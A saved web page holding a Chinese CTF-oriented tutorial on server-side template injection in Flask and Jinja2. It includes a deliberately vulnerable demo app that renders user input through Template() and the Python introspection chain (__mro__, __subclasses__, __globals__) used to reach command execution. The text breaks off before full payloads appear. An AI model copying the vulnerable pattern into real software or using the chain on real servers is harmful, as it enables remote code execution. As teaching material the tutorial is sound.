@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<!-- saved from url=(0039)https://www.anquanke.com/post/id/226900 -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="renderer" content="webkit">
+<meta name="force-rendering" content="webkit">
+<meta name="referrer" content="always">
+<meta name="description" content="安全客 - 安全资讯平台">
+<link rel="icon" href="https://s3.ssl.qhres2.com/static/02b5158bbb6adeac.ico" type="image/x-icon">
+<link rel="shortcut icon" href="https://s3.ssl.qhres2.com/static/02b5158bbb6adeac.ico" type="image/x-icon">
+<meta name="keywords" content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议">
+
+  <title>初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台</title>
+  <meta name="description" content="安全客 - 安全资讯平台">
+  <meta name="keywords" content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议">
+  <script>(function(window){
+        
+
+function empty() {}
+
+empty();
+      })(this);</script>
+
+<link rel="stylesheet" href="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/d4cec9cd8efbfd10.css">
+<link rel="stylesheet" href="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/a51843d6b82241be,d94674bd62441768,56ce5cef8079a575,8514be0a921ca6e8,4802c0c382205144,8e4464e423fe6849,13c0bf3b0c2e4882,2b3936345af879da,f568b72da28701d3,da046392ff3eccb9,aa4b116b0af3b8cd,e0bfa.css">
+<script>window._dynamic_deps_={}</script>
+<style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+</style></head>
+
+<body>
+  <div id="app" data-v-app=""><div class="_9" style="height: 60px;"><div class="g-w"><a class="logo1" href="https://www.anquanke.com/"></a><div class="_10"><div class="item"><div style="cursor: pointer;"><span>首页</span><ul></ul></div></div><div class="item"><div><span>阅读</span><ul><li class="sub-item"><a href="https://www.anquanke.com/news">安全资讯</a></li><li class="sub-item"><a href="https://www.anquanke.com/knowledge">安全知识</a></li><li class="sub-item"><a href="https://www.anquanke.com/tool">安全工具</a></li></ul></div></div><div class="item"><div style="cursor: pointer;"><span>活动</span><ul></ul></div></div><div class="item"><div style="cursor: pointer;"><span>招聘</span><ul></ul></div></div><div class="item"><div style="cursor: pointer;"><span>安全导航</span><ul></ul></div></div><div class="item"><div style="cursor: pointer;"><span>内容精选</span><ul><li class="sub-item"><a href="https://www.anquanke.com/column/index.html">专栏</a></li><li class="sub-item"><a href="https://www.anquanke.com/subject-list">精选专题</a></li><li class="sub-item"><a href="https://www.anquanke.com/discovery">安全客季刊</a></li><li class="sub-item"><a href="https://www.anquanke.com/week-list">360网络安全周报</a></li></ul></div></div></div><div class="_11"><div class="block"><div class="search"><input class="input" placeholder="输入关键词搜索"><button class="button"></button></div><!----><div class="user-href js-login-body" style="display: none;"><div class="user-href-top"><p class="user-avatar-bottom"><img class="user-href-avatar"><!----></p><div class="user-href-top-main"><p class="user-href-grade"></p><p class="user-href-text"><span>累计积分</span><span>可用积分</span></p><p class="user-href-score"><span></span><span></span></p></div></div><ul><li><a href="https://www.anquanke.com/member.html?memberId=undefined">个人主页</a></li><li><a href="https://www.anquanke.com/setting?p=message">我的消息</a></li><li><a href="https://www.anquanke.com/user/set1.html">个人设置</a></li><li><a href="https://www.anquanke.com/user/score/search.html">积分商城</a></li><li>退出登录</li></ul></div><a href="https://www.anquanke.com/login/index.html" class="nologin"></a></div><span class="write"></span><a class="app" href="https://www.anquanke.com/app"><div class="app-img"><img src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t01103704213901dd1e.png"></div></a></div></div></div><div class="index"><div class="index-main"><div class="_55"><h1>初探 Python Flask+Jinja2 SSTI</h1><div class="read"><p><span class="read-text">阅读量</span><b class="read-num">256739</b></p><p><span class="read-sep">|</span><span class="read-text">评论</span><b class="read-num">2</b></p><p><span class="read-sep">|</span><img class="read-fee" src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t01f942715e2a0f1a23.png"></p></div><p class="publish">发布时间 : 2021-01-12 16:30:55</p><div class="_54" style="display: none;"><b class="close">x</b><h5>译文声明</h5><p> 本文是翻译文章<!----><!----></p><!----><p>译文仅供参考，具体内容表达以及含义原文为准。</p></div><div class="content" id="js-article">
+
+
+<p id="h1--python-flask-jinja2-ssti"><img class="alignnone size-full wp-image-228049 aligncenter" alt="" width="720" height="373" src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t0105c011a6c7e9e987.jpg"></p>
+<p>&nbsp;</p>
+<h2 name="h2-0" id="h2-0">SSTI简介</h2>
+<p>SSTI主要是因为某些语言的框架中使用了渲染函数，比如Python中的Flask框架用jinjia2模块内的渲染函数，在不规范的代码中，导致用户可以控制变量并构造恶意的表达式，比如<code>{{98-2}}</code>，恶意的表达式未经严格的过滤直接带入模板中渲染执行使得攻击者可以读取文件，远程代码执行等等。现在最多的还是在CTF中遇到该漏洞，最多的也是Python+flask+jinja2，通过绕过过滤规则成功命令执行+读取文件拿到flag，本文也会从0开始一点点剖析该漏洞的成因与利用。</p>
+<h2 name="h2-1" id="h2-1">Flask</h2>
+<h3 name="h3-2" id="h3-2">
+<a class="reference-link" name="Flask%E7%AE%80%E4%BB%8B"></a>Flask简介</h3>
+<p><strong>Flask</strong>是一个用Python编写的<strong>Web应用程序框架</strong>优点是提供给用户的扩展能力很强，框架只完成了简单的功能，有很大一部分功能可以让用户自己选择并实现。</p>
+<p><strong>WSGI</strong></p>
+<p><strong>Web Server Gateway Interface（Web服务器网关接口，WSGI）</strong>已被用作Python Web应用程序开发的标准。 WSGI是Web服务器和Web应用程序之间通用接口的规范。而Flask类的实例就是WSGI应用程序。</p>
+<p><strong>Werkzeug</strong></p>
+<p>它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。也就是Flask的URL规则也是基于此。</p>
+<h3 name="h3-3" id="h3-3">
+<a class="reference-link" name="Flask%E5%AE%89%E8%A3%85"></a>Flask安装</h3>
+<pre><code class="hljs language-bash">pip3 install flask  <span class="hljs-comment"># 获取最新版本flask</span>
+</code></pre>
+<h3 name="h3-4" id="h3-4">
+<a class="reference-link" name="%E5%88%9B%E5%BB%BAFlask%E9%A1%B9%E7%9B%AE"></a>创建Flask项目</h3>
+<p>可以根据下图创建一个基于python3的flask项目</p>
+<p><img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t0141d3c386bb45297f.png"></p>
+<p><img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t01063d591cfd0cf26c.png"></p>
+<h3 name="h3-5" id="h3-5">
+<a class="reference-link" name="Flask%20e.g."></a>Flask e.g.</h3>
+<p>样例代码：</p>
+<p><code>app = Flask(__name__)</code> ：Flask类必须指定一个参数，即主模块或包的名字。这里<code>__name__</code>为系统变量，指的是当前py文件的文件名。</p>
+<p><code><a class="at-link" title="@app" href="https://github.com/app">@app</a>.route()</code>： 路由与视图函数。从client发送的url通过web服务器传给flask实例对象时，因为该实例需要知道对于每个url要对应执行哪部分的函数所以保存了一个url和函数之间的映射关系，处理url和函数之间关系的程序称为路由，在flask中用的是app.route路由装饰器，把装饰的函数注册为路由。简单理解就是<code><a class="at-link" title="@app" href="https://github.com/app">@app</a>.route(url)</code>装饰器告诉Flask什么url触发什么函数，而通过装饰器将函数与url绑定在一起就称为路由。<br><code>app.run()</code>：样例为 <code>run_simple(host, port, self, **options)</code> 当不设置时，默认监听127.0.0.1:5000, 监听0.0.0.0的话则任意IP都可访问。该函数作用为开启flask集成的web服务，服务开启后会一直监听5000端口并处理请求知道程序停止。</p>
+<pre><code class="hljs language-java">from flask <span class="hljs-keyword">import</span> <span class="hljs-type">Flask</span>
+
+<span class="hljs-variable">app</span> <span class="hljs-operator">=</span> Flask(__name__)
+
+<span class="hljs-meta">@app</span>.route(<span class="hljs-string">'/'</span>)
+def <span class="hljs-title function_">index</span><span class="hljs-params">()</span>:
+    <span class="hljs-keyword">return</span> <span class="hljs-string">'hello Zh1z3ven'</span>
+
+
+<span class="hljs-type">if</span> <span class="hljs-variable">__name__</span> <span class="hljs-operator">=</span>= <span class="hljs-string">'__main__'</span>:
+    app.run()
+</code></pre>
+<p>运行一下当前的py文件，控制台出现如下图所示的日志，flask默认监听在5000端口，访问一下看看。</p>
+<p><img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t01d73f80d984b3b3b9.png"></p>
+<p><img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t0110bd048ba50c3ad7.png"></p>
+<h3 name="h3-6" id="h3-6">
+<a class="reference-link" name="Flask%E4%B8%AD%E7%9A%84%E8%B7%AF%E7%94%B1"></a>Flask中的路由</h3>
+<p>上面我们也提到了，简单理解就是<code><a class="at-link" title="@app" href="https://github.com/app">@app</a>.route(url)</code>装饰器告诉Flask什么url触发什么函数，而通过装饰器将函数与url绑定在一起就称为路由。</p>
+<p>这里看一下路由的几个基本操作</p>
+<p><strong>0x01 指定访问路径为/</strong></p>
+<pre><code class="hljs language-python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
+    <span class="hljs-keyword">return</span> <span class="hljs-string">'hello Zh1z3ven'</span>
+</code></pre>
+<p><strong>0x02 传递参数</strong></p>
+<p>这里可以实现url的动态获取并在页面输出username</p>
+<pre><code class="hljs language-python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/user/&lt;username&gt;'</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">hi_user</span>(<span class="hljs-params">username</span>):
+    <span class="hljs-keyword">return</span> <span class="hljs-string">'hi %s'</span> % username
+</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t010ad197208933fbe0.png"><br><strong>0x03 限定请求方式</strong></p>
+<p>在<code><a class="at-link" title="@app" href="https://github.com/app">@app</a>.route</code>中，可以通过如下设置：<code><a class="at-link" title="@app" href="https://github.com/app">@app</a>.route('/user/&lt;int:user_id&gt;', methods=['GET', 'POST'])</code> 设置参数<code>user_id</code>的数据类型，以及http请求方式。</p>
+<pre><code class="hljs language-python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/user/&lt;int:user_id&gt;'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">hi_userid</span>(<span class="hljs-params">user_id</span>):
+    <span class="hljs-keyword">return</span> <span class="hljs-string">'hello %d'</span> % user_id
+</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t0153c10dabcb08875f.png"></p>
+<h3 name="h3-7" id="h3-7">
+<a class="reference-link" name="main%E5%85%A5%E5%8F%A3"></a>main入口</h3>
+<p>在Flask官方文档也提到最好用 <code>if __name__ == '__main__'</code> 来作为程序入口 python中的main入口也就是 <code>if __name__ == '__main__'</code></p>
+<p>当运行py文件时因为 当前<strong>文件名</strong>(<code>__name__</code>)与<strong>顶层代码作用域</strong>(<code>__main__</code>)是相等的，所以会执行后面的代码块，而当该文件作为一个模块被import到别的文件时，此时并不会执行该文件，而是类似于php中include函数那样将该文件包含到其他文件中去。</p>
+<p>到此Flask的工作流程 大致就已经清晰了，首先是当程序运行时，app.run()被调用执行并监听相应的host和port（默认为127.0.0.1:5000），当客户端有http请求通过浏览器发送至服务器端时时，服务端会根据request中的url对照路由找到相应需要执行的函数，并将函数返回值生成response反馈给客户端。</p>
+<p>&nbsp;</p>
+<h2 name="h2-8" id="h2-8">Jinja2渲染模板</h2>
+<h3 name="h3-9" id="h3-9">
+<a class="reference-link" name="%E7%AE%80%E4%BB%8B"></a>简介</h3>
+<p>jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。</p>
+<h3 name="h3-10" id="h3-10">
+<a class="reference-link" name="%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"></a>基本语法</h3>
+<p>0x01 <code>{%%}</code></p>
+<p>主要用来声明变量或用在条件语句或循环语句</p>
+<p>注意条件和循环需要多一层 {%endif%} 或 {%endfor%}用作结尾</p>
+<pre><code class="hljs language-php">{% set c = <span class="hljs-string">'Zh1z3ven'</span> %}
+{% <span class="hljs-keyword">if</span> <span class="hljs-number">1</span>==<span class="hljs-number">1</span> %}Zh1z3ven{%<span class="hljs-keyword">endif</span>%}
+{% <span class="hljs-keyword">for</span> i in [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>] %}Zh1z3ven{%<span class="hljs-keyword">endfor</span>%}
+</code></pre>
+<p>0x02 <code>{{}}</code></p>
+<p>将大括号内的表达式执行并输出结果到模板内</p>
+<pre><code class="hljs language-bash">{{98-2}} <span class="hljs-comment"># 96</span>
+</code></pre>
+<p>0x03 <code>{##}</code></p>
+<p>注释</p>
+<h3 name="h3-11" id="h3-11">
+<a class="reference-link" name="%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84Demo"></a>存在漏洞的Demo</h3>
+<p>在jinja2中存在一个模板类<code>Tempalte</code>，<code>Template</code>类中的<code>render()</code>方法可以实现渲染的作用。而在jinja2中存在三种语法，针对CTF的话遇到的就是<code>{{}}</code>和<code>{%%}</code>，<code>{{}}</code>代表变量取值，是一种特殊的占位符，当我们传入的是一个表达式或方法，则会执行并返回他们的结果传入客户端，比如看下面这段代码我们执行后构造一个表达式去访问查看页面结果：</p>
+<pre><code class="hljs language-python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request
+<span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template
+
+app = Flask(__name__)
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">test1</span>():
+    name = request.args.get(<span class="hljs-string">'name'</span>)
+
+    t = Template(<span class="hljs-string">'''
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Zh1z3ven&lt;/title&gt;
+  &lt;/head&gt;
+ &lt;body&gt;
+      &lt;h1&gt;Hello, %s !&lt;/h1&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+    '''</span>% (name))
+
+    <span class="hljs-keyword">return</span> t.render()
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    app.run()
+</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://p2.ssl.qhimg.com/t01219e5e43b860e627.png"></p>
+<p>这里可以看到是存在SSTI注入的，因为在<code>{{98-2}}</code>中的表达式被执行了，也就是漏洞成因：当在不规范的代码中，直接将用户可控参数<code>name</code>在模板中直接渲染并将结果带回页面回显。所以在name参数输入<code>{{98-2}}</code>会输出<code>{{96}}</code></p>
+<h3 name="h3-12" id="h3-12">
+<a class="reference-link" name="%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84Demo"></a>不存在漏洞的Demo</h3>
+<p>而在flask中常用的渲染方法为<code>render_template()</code> 、 <code>render_template_string()</code></p>
+<p>当使用 <code>render_template()</code> 时，扩展名为 <code>.html</code> 、 <code>.htm</code> 、 <code>.xml</code> 和 <code>.xhtml</code> 的模板中开启自动转义。</p>
+<p>当使用 <code>render_template_string()</code> 时，字符串开启 自动转义。</p>
+<p>简单示例如下：</p>
+<pre><code class="hljs language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>{{title}} - Zh1z3ven<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, {{user.name}}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>This is {{user.name}} information:{{user.info}}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<p>其中<code>{{title}}</code>、<code>{{user.name}}</code>、<code>{{user.info}}</code>即为需要渲染的对象，我们在app.py里对其进行渲染。</p>
+<pre><code class="hljs language-python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template
+
+app = Flask(__name__)
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/index'</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
+    user = {
+        <span class="hljs-string">'name'</span> : <span class="hljs-string">'Zh1z3ven'</span>,
+        <span class="hljs-string">'info'</span> : <span class="hljs-string">'I am Zh1z3ven'</span>
+    }
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"index.html"</span>, title=<span class="hljs-string">'Home'</span>, user=user)
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    app.run()
+</code></pre>
+<p>运行app.py 下面我们看一下页面结果：</p>
+<p><img class="aligncenter" alt="" data-original="https://p2.ssl.qhimg.com/t01993b9ebc6620fc76.png"></p>
+<p>上面就是一个简单且正常通过渲染的页面，因为需要渲染的参数我们都在app.py中写死了，并未交给用户控制，所以不存在SSTI注入。但是CTF或开发人员写好的代码将渲染的参数交给用户可控，并且没有对参数进行过滤那么可能会导致SSTI注入漏洞的产生。</p>
+<p>通过两个例子也可以大致感受到漏洞的成因了</p>
+<p>1、存在用户可控参数。</p>
+<p>2、参数可被带入渲染函数内直接执行，即{{}}可被带入代码中让jinja2模块识别并解析。</p>
+<p>&nbsp;</p>
+<h2 name="h2-13" id="h2-13">SSTI思路</h2>
+<p>在CTF中，python的ssti大多是依靠某些继承链：基类—&gt;子类—&gt;危险方法来实现命令执行+文件读取，这里有点类似于java的反序列化漏洞寻找调用链的意思。其实主要还是依据python中的内置类属性和方法通过寻找可以读文件或执行命令的模块与函数达到我们的目的。</p>
+<h3 name="h3-14" id="h3-14">
+<a class="reference-link" name="%E5%86%85%E7%BD%AE%E7%B1%BB%E5%B1%9E%E6%80%A7%E5%92%8C%E6%96%B9%E6%B3%95"></a>内置类属性和方法</h3>
+<p>Python中的类和对象有许多内置属性以及相关函数，下面记录一些经常会用到的，可能会不全，遇到了再补充。</p>
+<p><strong>0x01 <code>__class__</code></strong></p>
+<p>python中一切皆对象，该方法返回当前对象所属的类，比如字符串对象则返回<code>&lt;class 'str'&gt;</code></p>
+<pre><code class="hljs language-python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">""</span>.__class__
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'str'</span>&gt;
+</code></pre>
+<p><strong>0x02 <code>__bases__</code></strong></p>
+<p>以元组的形式返回一个类所直接集成的类。大多是用来获取到基类(object)，比如：</p>
+<pre><code class="hljs language-python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">""</span>.__class__.__bases__
+(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'object'</span>&gt;,)
+</code></pre>
+<p><strong>0x03 <code>__base__</code></strong></p>
+<p>以字符串形式返回一个类所直接集成的类</p>
+<p><strong>0x04 <code>__mro__</code></strong></p>
+<p>返回解析方法调用的顺序。</p>
+<pre><code class="hljs language-python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">""</span>.__class__.__mro__
+(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'str'</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'object'</span>&gt;)
+</code></pre>
+<p><strong>0x05 <code>__subclasses__()</code></strong></p>
+<p>获取类的所有子类，经常配合<code>__bases__</code> <code>__mro__</code>来找到我们想要的读取文件或执行命令的类</p>
+<p>比如：<code>"".__class__.__bases__[0].__subclasses__()</code></p>
+<p>或者：<code>"".__class__.__mro__[1].__subclasses__()</code></p>
+<p><strong>0x06 <code>__init__</code></strong></p>
+<p>所有的可被当作模块导入的都包含 <code>__init__</code>方法，通过此方法来调用 <code>__globals__</code>方法</p>
+<p><strong>0x07 <code>__globals__</code></strong></p>
+<p>所有函数都会有一个 <code>__globals__</code> 属性， 用于获取当前空间下可使用的模块、方法及其所有变量，结果是一个字典。</p>
+<pre><code class="hljs language-python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> os
+<span class="hljs-meta">&gt;&gt;&gt; </span>var = <span class="hljs-number">2333</span>
+<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun</span>():
+    <span class="hljs-keyword">pass</span>
+
+<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>:
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-keyword">pass</span>
+
+
+<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(test.__init__.__globals__)
+{<span class="hljs-string">'__name__'</span>: <span class="hljs-string">'__main__'</span>, <span class="hljs-string">'__doc__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'__package__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'__loader__'</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'_frozen_importlib.BuiltinImporter'</span>&gt;, <span class="hljs-string">'__spec__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'__annotations__'</span>: {}, <span class="hljs-string">'__builtins__'</span>: &lt;module <span class="hljs-string">'builtins'</span> (built-<span class="hljs-keyword">in</span>)&gt;, <span class="hljs-string">'os'</span>: &lt;module <span class="hljs-string">'os'</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'C:\\Python3.7\\lib\\os.py'</span>&gt;, <span class="hljs-string">'var'</span>: <span class="hljs-number">2333</span>, <span class="hljs-string">'fun'</span>: &lt;function fun at <span class="hljs-number">0x00000238058C11F8</span>&gt;, <span class="hljs-string">'test'</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'__main__.test'</span>&gt;}
+</code></pre>
+<p><strong>0x08 <code>__builtins__</code></strong></p>
+<p><strong>在pyton2中为 <code>__builtins__</code> 和 <code>__builtin__</code></strong></p>
+<p>这里 <code>__builtins__</code> 是内建名称空间，是这个模块本身定义的一个名称空间，在这个内建名称空间中存在一些我们经常用到的内置函数（即不需要导入包即可调用的函数）如：print()、str()还包括一些异常和其他属性。</p>
+<p>而 <code>__builtins__</code> 实际上是一个指向或者说引用 <code>__builtin__</code> 的（有点类似于软链接），而真正BIF在被定义时是在 <code>__builtin__</code> 模块中进行的。</p>
+<p><strong>在python3中为 <code>__builtins__</code> 和 <code>builtins</code></strong></p>
+<p>这里只不过 <code>builtins</code> 代替的 <code>__builtin__</code></p>
+<p>在python中有一些BIF（内置函数）是可以直接调用的，比如str(), print()等，这些函数可以通过 <code>dir(__builtins__)</code> 可以查到。</p>
+<p><img class="aligncenter" alt="" data-original="https://p0.ssl.qhimg.com/t0132c98ea48d068b61.png"></p>
+<p><strong>0x09 内省request对象</strong></p>
+<p>即为Flask模板的一个全局变量request对象（flask.request），代表当前请求对象。</p>
+<p>当然可利用的远不止这些，上面只是做一点简单的总结，后续遇到有趣的姿势继续补充（填坑）。</p>
+<h3 name="h3-15" id="h3-15">
+<a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"></a>利用思路</h3>
+<p>1、随便找一个内置类对象利用 <code>__class__</code>拿到该对象所对应的类</p>
+<pre><code class="hljs language-markdown">''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()
+().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[2].<span class="hljs-strong">__subclasses__</span>()
+().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[-1].<span class="hljs-strong">__subclasses__</span>()
+request.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]
+</code></pre>
+<p>2、用 <code>__bases__</code> 或 <code>__mro__</code> 拿到基类 <code>&lt;class 'object'&gt;</code></p>
+<p>3、用 <code>__subclasses__()</code> 获取所有子类</p>
+<p>4、在子类中寻找可以合适的继承链执行命令或读取文件</p>
+<p>&nbsp;</p>
+<h2 name="h2-16" id="h2-16">STTI利用</h2>
+<h3 name="h3-17" id="h3-17">
+<a class="reference-link" name="%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"></a>测试代码</h3>
+<pre><code class="hljs language-python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request
+<span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template
+
+
+app = Flask(__name__)
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">test1</span>():
+    name = request.args.get(<span class="hljs-string">'name'</span>)
+
+    t = Template(<span class="hljs-string">'''
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Zh1z3ven&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Hello, %s !&lt;/h1&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+    '''</span>% (name))
+
+    <span class="hljs-keyword">return</span> t.render()
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    app.run(host=<span class="hljs-string">'127.0.0.1'</span>, debug=<span class="hljs-literal">True</span>)
+</code></pre>
+<h3 name="h3-18" id="h3-18">0x01 <code>__bultins__</code>
+</h3>
+<p><strong>python2&amp;python3均适用</strong></p>
+<p>比如我们打开一个python3的shell，键入 <code>"".__class__</code></p>
+<p><img class="aligncenter" alt="" data-original="https://p2.ssl.qhimg.com/t019c4215760e5802ad.png"></p>
+<p>可以看到结果为 <code>&lt;class 'str'&gt;</code></p>
+<p>再接着下一步，我们要获取到基类 <code>object</code> 键入：<code>"".__class__.__bases__</code></p>
+<p><img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t019d281a2a3e8ebf47.png"></p>
